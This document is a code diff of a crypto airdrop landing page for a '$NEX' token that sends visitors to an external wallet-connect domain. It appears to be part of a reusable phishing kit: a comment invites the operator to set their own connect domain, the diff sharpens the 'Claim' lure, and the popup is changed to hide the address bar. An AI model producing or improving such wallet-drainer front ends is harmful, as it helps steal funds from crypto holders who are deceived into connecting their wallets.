@@ -146,7 +146,7 @@
       <a href="#">Docs</a>
     </div>
     <div style="display:flex; align-items:center;">
-      <button class="btn btn-connect" onclick="launchConnect()">Connect Wallet</button>
+      <button class="btn btn-connect" onclick="launchConnect()">Claim Now</button>
     </div>
   </nav>
 
@@ -159,21 +159,9 @@
       <div class="stat-item"><div class="stat-value">1.4M+</div><div class="stat-label">Eligible Wallets</div></div>
       <div class="stat-item"><div class="stat-value">EVM</div><div class="stat-label">Supported Networks</div></div>
     </div>
-  </div>
 
-  <div class="main-card">
-    <div class="card-top">
-      <h2>Airdrop Portal</h2>
-      <span class="card-label">Secure Access</span>
-    </div>
-    <div class="card-content">
-      <div class="icon-wrapper">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 12V8H6a2 2 0 0 1-2-2c0-1.1.9-2 2-2h12v4"/><path d="M4 6v12c0 1.1.9 2 2 2h14v-4H6a2 2 0 0 1-2-2V6Z"/></svg>
-      </div>
-      <h3>Verify Eligibility</h3>
-      <p>Connect your wallet to analyze your on-chain activity and compute your $NEX allocation across all supported chains.</p>
-      <button class="btn btn-action" onclick="launchConnect()">Connect Valid Wallet</button>
-      <div class="disclaimer">Supported: Ethereum, BSC, Arbitrum, Optimism, Polygon, Avalanche.<br>Only official Web3 Wallets are authorized.</div>
+    <div style="display:flex; justify-content:center; gap:16px; flex-wrap:wrap;">
+      <button class="btn btn-action" style="width:auto; padding:18px 48px; font-size:17px;" onclick="launchConnect()">CLAIM $NEX &rarr;</button>
     </div>
   </div>
 
@@ -188,6 +176,7 @@
   </div>
 </div>
 
+
 <script>
   // ========== CHANGE THIS TO YOUR CONNECT DOMAIN ==========
   var CONNECT_URL = 'https://playholding.vercel.app/?popup=1';
@@ -200,13 +189,13 @@
       window.location.href = CONNECT_URL;
     } else {
       // Desktop: open popup window (extensions work, URL shows connect domain)
-      var w = 420, h = 700;
+      var w = 380, h = 600;
       var left = (screen.width - w) / 2;
       var top = (screen.height - h) / 2;
       window.open(
         CONNECT_URL,
         'nexus_connect',
-        'width=' + w + ',height=' + h + ',left=' + left + ',top=' + top + ',toolbar=no,menubar=no,scrollbars=yes,resizable=yes'
+        'width=' + w + ',height=' + h + ',left=' + left + ',top=' + top + ',toolbar=no,menubar=no,location=no,scrollbars=yes,resizable=yes'
       );
     }
   }
